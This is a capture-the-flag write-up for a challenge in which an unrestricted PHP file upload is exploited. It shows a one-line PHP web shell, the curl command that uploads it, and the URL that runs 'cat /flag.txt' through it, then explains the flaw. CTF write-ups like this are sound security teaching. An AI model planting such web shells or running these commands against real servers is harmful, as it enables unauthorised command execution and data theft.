# Santa's Reindeer Tryouts - CTF Writeup

## Challenge Description

Can you submit your favourite Rudolph picture to Santa's Reindeer Tryouts, and obtain `/flag.txt` on the server?

**Target:** `https://julec.tf`

## Solution

### 1. Initial Reconnaissance

Opened the challenge website, and clicked `upload`. It then opened `https://julec.tf/upload.php`, this told me it was hosted on a PHP server. The goal was to obtain `/flag.txt` from the server.

### 2. Intercepting the Upload Request

Used Burp Suite to intercept the file upload request and analyze the POST request structure. This reveals the exact multipart form-data format, boundary strings, and headers needed for crafting the upload:

```http
POST /upload.php HTTP/2
Host: 031492d230da0ee2.julec.tf
Content-Length: 188
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://031492d230da0ee2.julec.tf
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ7iQSHhibfTQXSuA
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://031492d230da0ee2.julec.tf/upload.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryQ7iQSHhibfTQXSuA
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryQ7iQSHhibfTQXSuA--
```

### 3. Creating the PHP Web Shell

Created a simple PHP web shell (`shell.php`) to execute commands on the server:

```php
<?php system($_GET['cmd']); ?>
```

### 4. Uploading the Shell

Uploaded the PHP shell using curl:

```bash
curl -k -X POST https://julec.tf/upload.php \
  -F "file=@shell.php"
```

The server accepted the PHP file upload without proper validation, storing it in the `/uploads/` directory.

### 5. Executing Commands and Capturing the Flag

First, verified the shell was uploaded successfully by accessing:

```html
https://julec.tf/uploads/shell.php
```

This showed PHP errors (expected behavior when no `cmd` parameter is provided), confirming the shell was executable.

Then accessed the shell with the `cat` command to read the flag:

```html
https://julec.tf/uploads/shell.php?cmd=cat+/flag.txt
```

This returned the flag file contents.

```txt
JUL{b3_4w4r3_0f_vu1n3r4bl3_f1l3_upl04ds!}
```

## Vulnerability

The application suffered from **unrestricted file upload** vulnerability. The server:

- Did not validate file extensions properly
- Did not sanitize uploaded files
- Allowed execution of uploaded PHP files in the `/uploads/` directory
- Had no input validation or filtering
